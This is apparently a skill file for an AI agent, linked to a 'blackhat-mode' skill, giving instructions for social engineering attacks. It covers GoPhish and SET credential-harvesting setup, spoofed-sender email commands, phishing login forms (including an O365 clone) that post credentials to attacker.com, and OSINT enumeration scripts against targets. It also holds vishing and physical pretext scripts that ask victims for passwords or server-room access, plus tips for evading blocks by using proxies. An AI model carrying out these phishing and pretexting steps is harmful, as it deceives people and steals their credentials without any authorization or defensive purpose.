---
name: social-tools
description: "Social engineering — phishing, pretexting, OSINT, impersonation."
version: 2.0.0
author: Yatim
metadata:
  hermes:
    tags: [social, phishing, pretext, osint, impersonate, recon]
    related_skills: [blackhat-mode, recon-tools, cred-tools]
prerequisites:
  commands: [python]
---

# Social Engineering Tools

## When to Load This Skill

User requests:
- "social engineering", "phishing", "pretext"
- "OSINT", "recon", "investigate", "profile"

---

## Phishing

### GoPhish

```bash
# Install
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-0.12.1-linux-64bit.zip
unzip gophish-*.zip
chmod +x gophish

# Start
./gophish

# Default: https://localhost:3333
# Default: admin / gophish
```

### SET (Social Engineering Toolkit)

```bash
# Start
setoolkit

# Menu
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack
4) Site Cloner
5) Enter URL to clone
```

### Swaks

```bash
# Send email
swaks --to TARGET --from spoofed@domain.com --server SMTP --header "Subject: Urgent" --body "Click here"

# With attachment
swaks --to TARGET --from spoofed@domain.com --server SMTP --header "Subject: Invoice" --attachment invoice.pdf
```

### Phishing Templates

```html
<!-- Login page -->
<form action="http://attacker.com/phish" method="POST">
  <input type="text" name="username" placeholder="Username">
  <input type="password" name="password" placeholder="Password">
  <button type="submit">Login</button>
</form>

<!-- O365 -->
<form action="http://attacker.com/phish" method="POST">
  <input type="email" name="loginfmt" placeholder="Email">
  <input type="password" name="passwd" placeholder="Password">
  <button type="submit">Sign in</button>
</form>
```

---

## OSINT

### theHarvester

```bash
# Email enumeration (curl-based)
curl -s "https://www.google.com/search?q=%40TARGET&num=100" -A "Mozilla/5.0" | grep -oE "[a-zA-Z0-9._%+-]+@TARGET"

# Subdomain enumeration
curl -s "https://api.subfinder.io/subdomain?domain=TARGET" | jq -r '.subdomains[]'

# DNS brute force
for sub in admin api dev staging test mail ftp; do
  dig +short $sub.TARGET
done
```

### Sherlock (curl-based)

```bash
# Username search — all via curl
for site in github twitter instagram linkedin; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://$site.com/USERNAME")
  echo "$site: $status"
done

# Or use API
curl -s "https://api.github.com/users/USERNAME" | jq .
```

### Holehe

```bash
# Email to accounts
holehe EMAIL

# Using modules
holehe EMAIL --modules instagram,twitter,facebook
```

### Maltego

```bash
# Start
maltego

# Transforms
- DNS to IP
- Email to Accounts
- Domain to Subdomains
- Person to Email
```

### Recon-ng

```bash
# Start
recon-ng

# Create workspace
workspaces create TARGET

# Load modules
workload install recon/domains-hosts/hackertarget

# Use module
use recon/domains-hosts/hackertarget

# Run
run
```

### SpiderFoot

```bash
# Start
python spiderfoot.py -l 127.0.0.1:5001

# Scan via API
curl -s "http://127.0.0.1:5001/scan/start?module=dns_resolve&target=TARGET" | jq .
curl -s "http://127.0.0.1:5001/scan/results?scan=SCAN_ID" | jq .
```

---

## Pretexting

### Vishing Script

```
"Hi, this is IT Support. We're seeing some issues with your account. Can you verify your username and password?"

"Hi, this is Security. We detected suspicious activity on your account. Can you confirm your last login?"

"Hi, this is HR. We need to verify your information for the new system. Can you provide your credentials?"
```

### Physical Pretext

```
# Delivery person
"Hi, I have a package for [NAME]. Can you let me in?"

# IT Support
"Hi, I'm here to fix the network issue. Can you show me the server room?"

# Maintenance
"Hi, I'm here for the scheduled maintenance. Can you point me to the electrical panel?"
```

---

## Python OSINT Tools

### Email Enum

```python
import requests

def email_enum(email):
    services = {
        'gmail': 'https://accounts.google.com',
        'outlook': 'https://login.live.com',
        'yahoo': 'https://login.yahoo.com',
    }
    
    results = {}
    for service, url in services.items():
        try:
            r = requests.get(f"{url}/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin")
            results[service] = r.status_code == 200
        except:
            results[service] = False
    
    return results
```

### Username Search

```python
import requests

def username_search(username):
    sites = {
        'github': f'https://github.com/{username}',
        'twitter': f'https://twitter.com/{username}',
        'instagram': f'https://instagram.com/{username}',
        'linkedin': f'https://linkedin.com/in/{username}',
    }
    
    results = {}
    for site, url in sites.items():
        try:
            r = requests.get(url, timeout=5)
            results[site] = r.status_code == 200
        except:
            results[site] = False
    
    return results
```

### Subdomain Finder

```python
import socket

def find_subdomains(domain, wordlist):
    found = []
    for sub in wordlist:
        try:
            hostname = f"{sub}.{domain}"
            socket.gethostbyname(hostname)
            found.append(hostname)
        except:
            pass
    return found
```

---

## Output Format

```json
{
  "target": "john@example.com",
  "emails": ["john@example.com", "john.doe@example.com"],
  "accounts": {
    "github": "johndoe",
    "twitter": "@johndoe"
  },
  "subdomains": ["api.example.com", "dev.example.com"],
  "phishing": {
    "sent": 100,
    "opened": 50,
    "clicked": 25,
    "credentials": 10
  }
}
```

---

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| Connection refused | SMTP blocked | Use different server |
| Rate limited | Too many requests | Wait and retry |
| Account locked | Too many attempts | Use different account |
| Blocked | IP blocked | Use proxy/VPN |
